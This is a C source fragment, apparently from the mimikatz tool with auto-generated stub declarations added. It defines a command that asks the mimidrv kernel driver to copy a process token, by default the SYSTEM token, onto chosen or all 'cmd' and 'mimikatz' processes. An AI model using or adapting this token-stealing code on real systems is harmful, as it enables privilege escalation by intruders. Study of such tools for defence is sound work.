#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
struct TYPE_3__ {void* toProcessId; void* fromProcessId; int /*<<< orphan*/  member_1; int /*<<< orphan*/  member_0; } ;
typedef  int /*<<< orphan*/  PCWCHAR ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  TYPE_1__ MIMIDRV_PROCESS_TOKEN_FROM_TO ;

/* Variables and functions */
 int /*<<< orphan*/  IOCTL_MIMIDRV_PROCESS_TOKEN ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 int /*<<< orphan*/  kprintf (char*,...) ; 
 int /*<<< orphan*/  kull_m_kernel_mimidrv_simple_output (int /*<<< orphan*/ ,TYPE_1__*,int) ; 
 scalar_t__ kull_m_string_args_byName (int,int /*<<< orphan*/ **,char*,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 void* wcstoul (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 

NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
{
	MIMIDRV_PROCESS_TOKEN_FROM_TO tokenInfo = {0, 0};
	PCWCHAR szFrom, szTo;

	if(kull_m_string_args_byName(argc, argv, L"from", &szFrom, NULL))
		tokenInfo.fromProcessId = wcstoul(szFrom, NULL, 0);

	if(kull_m_string_args_byName(argc, argv, L"to", &szTo, NULL))
		tokenInfo.toProcessId = wcstoul(szTo, NULL, 0);

	kprintf(L"Token from process %u to process %u\n", tokenInfo.fromProcessId, tokenInfo.toProcessId);
	if(!tokenInfo.fromProcessId)
		kprintf(L" * from 0 will take SYSTEM token\n");
	if(!tokenInfo.toProcessId)
		kprintf(L" * to 0 will take all \'cmd\' and \'mimikatz\' process\n");

	kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_TOKEN, &tokenInfo, sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO));

	return STATUS_SUCCESS;
}